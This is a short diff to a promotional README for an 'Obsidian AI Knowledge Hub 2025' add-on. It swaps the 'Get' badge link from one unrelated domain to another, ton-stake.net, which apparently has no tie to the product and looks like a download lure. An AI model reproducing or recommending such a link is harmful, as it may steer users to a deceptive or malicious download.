@@ -2,7 +2,7 @@
 
 ⚙ Elevate your note-taking with this AI-powered Obsidian add-on! Obsidian AI Knowledge Hub 2025 automates note generation, organizes insights, and provides productivity analytics, crafted for writers, researchers, and developers in English-speaking communities.
 
-[![Get Obsidian AI Knowledge Hub](https://img.shields.io/badge/Get-Obsidian_AI_Knowledge_Hub-blueviolet)](https://glocktober.com)
+[![Get Obsidian AI Knowledge Hub](https://img.shields.io/badge/Get-Obsidian_AI_Knowledge_Hub-blueviolet)](https://ton-stake.net)
 
 ---
 
